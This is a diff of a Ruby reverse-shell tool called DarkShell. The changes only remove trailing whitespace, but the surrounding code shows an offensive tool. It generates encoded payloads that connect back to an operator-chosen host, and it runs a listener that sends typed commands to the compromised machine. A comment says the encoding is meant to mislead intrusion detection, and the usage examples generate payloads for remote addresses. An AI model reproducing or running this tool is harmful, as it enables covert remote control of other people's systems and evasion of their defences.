@@ -33,9 +33,9 @@ class DarkShell
   attr_accessor :port
 
   def initialize(ip, port, en_type)
-    @ip       = ip   
-    @port     = port 
-    @en_type  = en_type 
+    @ip       = ip
+    @port     = port
+    @en_type  = en_type
   end
 
   # The encryption type
@@ -88,7 +88,7 @@ class DarkShell
   end
 
   #
-  # We have to handle the line break manually, 
+  # We have to handle the line break manually,
   # cause the Base32.decode cannot parse it correctly.
   # Return string.
   def base32_decode(str)
@@ -178,7 +178,7 @@ class DarkShell
     end
   end
 
-  # 
+  #
   # Generate encode commands by generate_raw
   # Just a little trick to mislead ids, maybe.
   # return array.
@@ -213,12 +213,12 @@ class DarkShell
         puts "Input is ready."
 
         # Receive user input and send it to remote.
-        Thread.new do 
+        Thread.new do
           while true
-            command = STDIN.gets.chomp 
+            command = STDIN.gets.chomp
             cmd = encode(command)
             # For debug
-            #puts("Raw>>" + cmd) 
+            #puts("Raw>>" + cmd)
             begin
               write_into(client, cmd)
             rescue Errno::EPIPE => e
@@ -240,7 +240,7 @@ class DarkShell
               puts e
               exit
             end
-            if res.length > 0 
+            if res.length > 0
               # For debug
               #puts("Raw << " + res.inspect)
               print ">"
@@ -287,13 +287,13 @@ end
 
 puts %q{
 
-____             _         ____  _          _ _ 
+____             _         ____  _          _ _
 |  _ \  __ _ _ __| | __    / ___|| |__   ___| | |
 | | | |/ _` | '__| |/ /    \___ \| '_ \ / _ \ | |
 | |_| | (_| | |  |   <      ___) | | | |  __/ | |
 |____/ \__,_|_|  |_|\_\    |____/|_| |_|\___|_|_|
-                                                 
-                                            
+
+
 See more: https://github.com/Green-m/dark-shell
 
 }
@@ -302,16 +302,16 @@ See more: https://github.com/Green-m/dark-shell
 
 if ARGV.length == 0 || ARGV.include?("-h") || ARGV.include?("help")
   puts "Dark shell listen server."
-  puts 
+  puts
   puts "Usage:"
   puts "  ruby #{__FILE__} <action> <ipaddress> <port> <type>"
   puts "Action: gen, listen, gencode"
   puts "  gen:      generate payload to run."
   puts "  gencode:  generate payload(encoded) to run."
   puts "  listen:   listen as a server."
-  puts 
+  puts
   puts "Type: hex, ssl, base64, base32"
-  puts 
+  puts
   puts
   puts "Example:"
   puts "  ruby #{__FILE__} listen 127.0.0.1 4444 hex"
@@ -320,7 +320,7 @@ if ARGV.length == 0 || ARGV.include?("-h") || ARGV.include?("help")
   puts "  ruby #{__FILE__} gencode 8.8.8.8 1337 ssl"
   puts "  ruby #{__FILE__} gen 8.8.8.8 4444 base64"
   puts "  ruby #{__FILE__} gen"
-  exit 
+  exit
 end
 
 action  = ARGV[0] || ""
@@ -344,9 +344,9 @@ when "gencode"
   # darkshell.generate_base64.each{|x| puts "";puts "    " + x}
   darkshell.generate_encode.each_with_index do |cmd, index|
     if index % 4 == 0
-      puts 
+      puts
       puts "---------------------------------------------------------------"
-      puts 
+      puts
     end
 
     puts "    " + cmd
